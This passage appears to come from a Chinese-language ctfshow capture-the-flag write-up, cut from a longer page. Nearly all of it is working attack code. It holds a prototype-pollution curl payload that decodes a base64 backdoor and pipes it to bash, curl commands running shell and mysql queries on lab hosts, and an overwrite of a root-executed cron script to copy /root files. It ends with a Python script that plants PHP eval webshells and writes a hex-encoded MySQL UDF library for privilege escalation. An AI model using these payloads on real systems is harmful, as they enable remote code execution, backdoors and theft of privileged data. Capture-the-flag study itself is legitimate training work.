</span></span><span class=line><span class=cl>        <span class=nx>res</span><span class=p>.</span><span class=nx>write</span><span class=p>(</span><span class=nx>result</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>res</span><span class=p>.</span><span class=nx>write</span><span class=p>(</span><span class=nx>postHTML</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}}</span>
</span></span><span class=line><span class=cl>    <span class=k>catch</span><span class=p>{</span>
</span></span><span class=line><span class=cl>       <span class=nx>res</span><span class=p>.</span><span class=nx>write</span><span class=p>(</span><span class=nx>postHTML</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nx>res</span><span class=p>.</span><span class=nx>end</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=p>});</span>
</span></span><span class=line><span class=cl><span class=p>}).</span><span class=nx>listen</span><span class=p>(</span><span class=mi>8033</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1=echo `curl -i -X POST -H \&#39;Content-type\&#39;:\&#39;application/json\&#39; -d \&#34;{\\\&#34;__proto__\\\&#34;:{\\\&#34;__proto__\\\&#34;: {\\\&#34;type\\\&#34;:\\\&#34;Block\\\&#34;,\\\&#34;nodes\\\&#34;:\\\&#34;\\\&#34;,\\\&#34;compileDebug\\\&#34;:1,\\\&#34;self\\\&#34;:1,\\\&#34;line\\\&#34;:\\\&#34;global.process.mainModule.require(\&#39;child_process\&#39;).exec(\&#39;echo YmFzaCAtYyAiZWNobyBkbUZ5SUdoMGRIQWdQU0J5WlhGMWFYSmxLQ2RvZEhSd0p5azdDblpoY2lCeGRXVnllWE4wY21sdVp5QTlJSEpsY1hWcGNtVW9KM0YxWlhKNWMzUnlhVzVuSnlrN0NncDJZWElnY0c5emRFaFVUVXdnUFNBbk1USXpKenNLSUFwb2RIUndMbU55WldGMFpWTmxjblpsY2lobWRXNWpkR2x2YmlBb2NtVnhMQ0J5WlhNcElIc0tJQ0IyWVhJZ1ltOWtlU0E5SUNJaU93b2dJSEpsY1M1dmJpZ25aR0YwWVNjc0lHWjFibU4wYVc5dUlDaGphSFZ1YXlrZ2V3b2dJQ0FnWW05a2VTQXJQU0JqYUhWdWF6c0tJQ0I5S1RzS0lDQnlaWEV1YjI0b0oyVnVaQ2NzSUdaMWJtTjBhVzl1SUNncElIc0tJQ0FnSUdKdlpIa2dQU0J4ZFdWeWVYTjBjbWx1Wnk1d1lYSnpaU2hpYjJSNUtUc0tJQ0FnSUhKbGN5NTNjbWwwWlVobFlXUW9NakF3TENCN0owTnZiblJsYm5RdFZIbHdaU2M2SUNkMFpYaDBMMmgwYld3N0lHTm9ZWEp6WlhROWRYUm1PQ2Q5S1RzS0lIUnllWHNLSUNBZ0lHbG1LR0p2WkhrdVkyMWtLU0I3Q2lBZ0lDQWdJQ0FnY21WekxuZHlhWFJsS0NKMWMyVnlibUZ0WmUrOG1pSWdLeUJpYjJSNUxtTnRaQ2s3Q2lBZ0lDQWdJQ0FnZG1GeUlISmxjM1ZzZEQwZ1oyeHZZbUZzTG5CeWIyTmxjM011YldGcGJrMXZaSFZzWlM1amIyNXpkSEoxWTNSdmNpNWZiRzloWkNnblkyaHBiR1JmY0hKdlkyVnpjeWNwTG1WNFpXTlRlVzVqS0NkaVlYTm9JQzFqSUNJbksySnZaSGt1WTIxa0t5Y2lKeWt1ZEc5VGRISnBibWNvS1RzS0lDQWdJQ0FnSUNCeVpYTXVkM0pwZEdVb2NtVnpkV3gwS1RzS0lDQWdJSDBnWld4elpTQjdDaUFnSUNBZ0lDQWdjbVZ6TG5keWFYUmxLSEJ2YzNSSVZFMU1LVHNLSUNBZ0lIMTlDaUFnSUNCallYUmphSHNLSUNBZ0lDQWdJSEpsY3k1M2NtbDBaU2h3YjNOMFNGUk5UQ2s3SUFvZ0lDQWdmUW9nSUNBZ2NtVnpMbVZ1WkNncE93b2dJSDBwT3dwOUtTNXNhWE4wWlc0b09EQXpNeWs3Q2c9PXxiYXNlNjQgLWQgPiAvaG9tZS9ub2RlL2FhLmpzO25vZGUgL2hvbWUvbm9kZS9hYS5qcyI=|base64 -d|bash\&#39;)\\\&#34;}}}\&#34; http://172.2.95.5:3000/login`;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>1=echo `curl -X POST -d &#34;cmd=mysql -uroot -proot -e &#39;use ctfshow;select * from ctfshow_secret&#39;&#34; http://172.2.95.5:8033`;
</span></span></code></pre></td></tr></table></div></div><h1 id=web669>web669</h1><p>有个root的进程且普通用户可编辑，且定时执行</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1=echo `curl -X POST -d &#34;cmd=ps -a&#34; http://172.2.141.5:8033`;
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=cp>#!/bin/sh
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=nb>true</span>
</span></span><span class=line><span class=cl><span class=k>do</span>
</span></span><span class=line><span class=cl>	sh /home/node/nodestartup.sh 
</span></span><span class=line><span class=cl>	sleep <span class=m>60</span>
</span></span><span class=line><span class=cl><span class=k>done</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1=echo `curl -X POST -d &#34;cmd=rm -rf nodestartup.sh;echo &#39;cat /root/* &gt; /home/node/1.txt &#39; &gt; nodestartup.sh&#34; http://172.2.141.5:8033`;
</span></span></code></pre></td></tr></table></div></div><h1 id=脚本>脚本</h1><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sess</span><span class=o>=</span><span class=n>requests</span><span class=o>.</span><span class=n>session</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>url</span><span class=o>=</span><span class=s2>&#34;http://1bc24237-9c92-4346-9f70-c6b15ce080f9.challenge.ctf.show/&#34;</span>   <span class=c1>#替换这里即可</span>
</span></span><span class=line><span class=cl><span class=c1>#模拟数据备份,写入木马</span>
</span></span><span class=line><span class=cl><span class=n>files</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;file&#39;</span><span class=p>:(</span><span class=s1>&#39;1.php&#39;</span><span class=p>,</span><span class=s2>&#34;&lt;?php eval($_POST[1]);?&gt;&#34;</span><span class=p>,</span><span class=s2>&#34;application/octet-stream&#34;</span><span class=p>)}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#生成木马</span>
</span></span><span class=line><span class=cl><span class=n>sess</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>+</span><span class=s2>&#34;system36d/users.php?action=upload&#34;</span><span class=p>,</span><span class=n>files</span><span class=o>=</span><span class=n>files</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>data1</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;key&#34;</span><span class=p>:</span><span class=s2>&#34;key_is_here_you_know&#34;</span><span class=p>,</span><span class=s2>&#34;file&#34;</span><span class=p>:</span><span class=s2>&#34;../db/data_you_never_know.db&#34;</span><span class=p>,</span><span class=s2>&#34;1&#34;</span><span class=p>:</span><span class=s2>&#34;file_put_contents(&#39;/var/www/html/a.php&#39;,&#39;&lt;?php eval($_POST[1]);?&gt;&#39;);&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>sess</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>+</span><span class=s1>&#39;system36d/util/common.php?k=flag_651=ctfshow</span><span class=si>{a4c64b86d754b3b132a138e3e0adcaa6}</span><span class=s1>&#39;</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=n>data1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#生成sql执行web界面</span>
</span></span><span class=line><span class=cl><span class=n>data3</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;key&#34;</span><span class=p>:</span><span class=s2>&#34;key_is_here_you_know&#34;</span><span class=p>,</span><span class=s2>&#34;file&#34;</span><span class=p>:</span><span class=s2>&#34;../db/data_you_never_know.db&#34;</span><span class=p>,</span><span class=s2>&#34;1&#34;</span><span class=p>:</span><span class=s2>&#34;file_put_contents(&#39;/var/www/html/sqltest.php&#39;,&#39;&lt;?php highlight_file(__FILE__);error_reporting(0);$mysqli = new mysqli(</span><span class=se>\&#34;</span><span class=s2>localhost</span><span class=se>\&#34;</span><span class=s2>,</span><span class=se>\&#34;</span><span class=s2>root</span><span class=se>\&#34;</span><span class=s2>,</span><span class=se>\&#34;</span><span class=s2>root</span><span class=se>\&#34;</span><span class=s2>,</span><span class=se>\&#34;</span><span class=s2>ctfshow</span><span class=se>\&#34;</span><span class=s2>);$tmp = $mysqli-&gt;query($_POST[</span><span class=se>\&#34;</span><span class=s2>sql</span><span class=se>\&#34;</span><span class=s2>]);$result = $tmp-&gt;fetch_all();print_r($result);?&gt;&#39;);&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>sess</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>+</span><span class=s2>&#34;a.php&#34;</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=n>data3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#udf提权</span>
</span></span><span class=line><span class=cl><span class=n>data2</span><span class=o>=</span><span class=p>{</span> <span class=s1>&#39;1&#39;</span><span class=p>:</span><span class=s1>&#39;file_put_contents(</span><span class=se>\&#39;</span><span class=s1>udf.so</span><span class=se>\&#39;</span><span class=s1>,hex2bin(</span><span class=se>\&#39;</span><span class=s1>7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e8162000</span><span class=se>\&#39;</span><span class=s1>));&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;file&#39;</span><span class=p>:</span><span class=s1>&#39;../db/data_you_never_know.db&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;key&#39;</span><span class=p>:</span><span class=s1>&#39;key_is_here_you_know&#39;</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>sess</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>+</span><span class=s2>&#34;a.php&#34;</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=n>data2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>data4</span><span class=o>=</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;1&#39;</span><span class=p>:</span><span class=s2>&#34;shell_exec(&#39;cp /var/www/html/udf.so /usr/lib/mariadb/plugin/udf.so&#39;);&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;file&#39;</span><span class=p>:</span><span class=s1>&#39;../db/data_you_never_know.db&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;key&#39;</span><span class=p>:</span><span class=s1>&#39;key_is_here_you_know&#39;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>sess</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>+</span><span class=s2>&#34;a.php&#34;</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=n>data4</span><span class=p>)</span>
